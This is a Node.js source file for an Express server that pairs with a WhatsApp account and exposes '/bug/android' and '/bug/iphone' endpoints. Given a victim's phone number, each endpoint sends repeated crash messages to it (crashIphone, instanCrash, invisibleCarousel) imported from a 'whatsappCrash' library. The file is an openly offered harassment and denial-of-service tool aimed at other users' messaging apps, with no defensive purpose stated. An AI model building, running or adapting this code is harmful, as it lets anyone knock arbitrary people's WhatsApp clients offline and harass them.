const {
   default: makeWASocket,
   useMultiFileAuthState,
   DisconnectReason,
   fetchLatestBaileysVersion
} = require("baileys");
const pino = require('pino');
const readline = require("readline");
const express = require("express");
const cors = require("cors");
const {
   consoleDye
} = require('./library/color');
const {
   invisibleCarousel,
   crashIphone,
   interactiveResponCall,
   instanCrash,
   nullsdelmsg
} = require("./library/whatsappCrash")
const sleep = async (ms) => {
   return new Promise(resolve => setTimeout(resolve, ms));
}
const app = express();
const PORT = process.env.PORT || 2111;
let client = null;
let isReady = false;
const formatPhone = (phone) => {
   const cleaned = phone.replace(/[^0-9]/g, "");
   if (cleaned.startsWith("0")) {
      return null;
   }
   return cleaned + '@s.whatsapp.net';
};
const question = (text) => {
   const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
   });
   return new Promise((resolve) => {
      rl.question(text, resolve)
   });
}
async function startWhatsApp() {
   try {
      const {
         state,
         saveCreds
      } = await useMultiFileAuthState('./session');
      const {
         version
      } = await fetchLatestBaileysVersion();
      client = makeWASocket({
         logger: pino({
            level: "silent"
         }),
         printQRInTerminal: false,
         auth: state,
         browser: ["Linux", "Safari", "6.12.6"],
         version
      });
      if (!client.authState.creds.registered) {
         const phoneNumber = await question(consoleDye.yellow(`📞 Enter your WhatsApp number (with country code): \n`));
         const code = await client.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''), "XNXXHARD");
         console.log(consoleDye.brightGreen.bold(`🔑 Pairing code: ${code}`));
      }
      client.ev.on('connection.update', (update) => {
         const {
            connection,
            lastDisconnect
         } = update;
         if (connection === 'close') {
            isReady = false;
            console.log(consoleDye.red.bold('❌ Connection closed'));
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
               console.log(consoleDye.yellow('🔄 Reconnecting in 3 seconds...'));
               setTimeout(startWhatsApp, 3000);
            }
         } else if (connection === 'open') {
            isReady = true;
            console.log(consoleDye.brightGreen.bold('✅ WhatsApp connected successfully!'));
         } else if (connection === 'connecting') {
            console.log(consoleDye.cyan('⏳ Connecting to WhatsApp...'));
         }
      });
      client.ev.on('creds.update', saveCreds);
   } catch (error) {
      console.error(consoleDye.red.bold('❌ WhatsApp initialization error:'), error.message);
   }
}
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({
   extended: true
}));
app.get('/', (req, res) => {
   res.json({
      status: true,
      message: "WhatsApp API is running",
      ready: isReady,
      endpoints: {
         status: "GET /status",
         carousels: "GET /bug/carousels",
         forcecall: "GET /bug/forcecall"
      }
   });
});
app.get('/status', (req, res) => {
   const status = {
      status: true,
      ready: isReady,
      uptime: Math.floor(process.uptime()),
      memory: process.memoryUsage(),
      timestamp: new Date().toISOString()
   };
   console.log(consoleDye.blue('📊 Status checked from:'), consoleDye.gray(req.ip));
   res.json(status);
});
app.get('/bug/android', async (req, res) => {
   try {
      if (!isReady) {
         console.log(consoleDye.yellow.bold('⚠️  Carousels request rejected - WhatsApp not ready'));
         return res.status(503).json({
            status: false,
            message: "WhatsApp not ready"
         });
      }
      const {
         target
      } = req.query;
      if (!target) {
         console.log(consoleDye.red('❌ Invalid request - missing target'));
         return res.status(400).json({
            status: false,
            message: "Target is required"
         });
      }
      const jid = formatPhone(target);
      if (!jid) {
         console.log(consoleDye.red(`❌ Invalid phone format: ${target}`));
         return res.status(400).json({
            status: false,
            message: "Invalid phone number format"
         });
      }
      console.log(consoleDye.brightYellow(`🎠 Sending bug android to ${target}`));
      console.log(consoleDye.gray(`   From IP: ${req.ip}`));
      await res.json({
         status: true,
         message: "Bug android sent successfully",
         target: jid,
         timestamp: new Date().toISOString()
      });
      await invisibleCarousel(client, jid)
      await invisibleCarousel(client, jid)
      await sleep(2000)
      await instanCrash(client, jid)
      await sleep(2000)
      for (let i = 0; i < 10; i++) {
         await invisibleCarousel(client, jid)
         await sleep(1000)
         await interactiveResponCall(client, jid)
         await sleep(1000)
         await invisibleCarousel(client, jid)
         await sleep(1000)
      }
   } catch (error) {
      console.error(consoleDye.red.bold('❌ Carousels error:'), error.message);
      res.status(500).json({
         status: false,
         message: "Failed to send carousels",
         error: error.message
      });
   }
});
app.get('/bug/iphone', async (req, res) => {
   try {
      if (!isReady) {
         console.log(consoleDye.yellow.bold('⚠️  Force call request rejected - WhatsApp not ready'));
         return res.status(503).json({
            status: false,
            message: "WhatsApp not ready"
         });
      }
      const {
         target
      } = req.query;
      if (!target) {
         console.log(consoleDye.red('❌ Invalid request - missing target'));
         return res.status(400).json({
            status: false,
            message: "Target is required"
         });
      }
      const jid = formatPhone(target);
      if (!jid) {
         console.log(consoleDye.red(`❌ Invalid phone format: ${target}`));
         return res.status(400).json({
            status: false,
            message: "Invalid phone number format"
         });
      }
      console.log(consoleDye.brightMagenta(`📞 Sending bug iphone to ${target}`));
      console.log(consoleDye.gray(`   From IP: ${req.ip}`));
      await res.json({
         status: true,
         message: "Bug ios sent successfully",
         target: jid,
         timestamp: new Date().toISOString()
      });
      await crashIphone(client, jid)
      await crashIphone(client, jid)
      await sleep(2000)
      await crashIphone(client, jid)
      await sleep(2000)
      for (let i = 0; i < 10; i++) {
         await crashIphone(client, jid)
         await sleep(1000)
         await crashIphone(client, jid)
         await sleep(1000)
         await crashIphone(client, jid)
         await sleep(1000)
      }
   } catch (error) {
      console.error(consoleDye.red.bold('❌ Force call error:'), error.message);
      res.status(500).json({
         status: false,
         message: "Failed to send force call",
         error: error.message
      });
   }
});
app.use('*', (req, res) => {
   console.log(consoleDye.yellow(`⚠️  404 - Endpoint not found: ${req.method} ${req.originalUrl}`));
   res.status(404).json({
      status: false,
      message: "Endpoint not found"
   });
});
app.listen(PORT, () => {
   console.log(consoleDye.brightBlue.bold(`🚀 Server running on http://localhost:${PORT}`));
   console.log(consoleDye.gray(`   Environment: ${process.env.NODE_ENV || 'development'}`));
   console.log(consoleDye.gray(`   Process ID: ${process.pid}`));
});
startWhatsApp();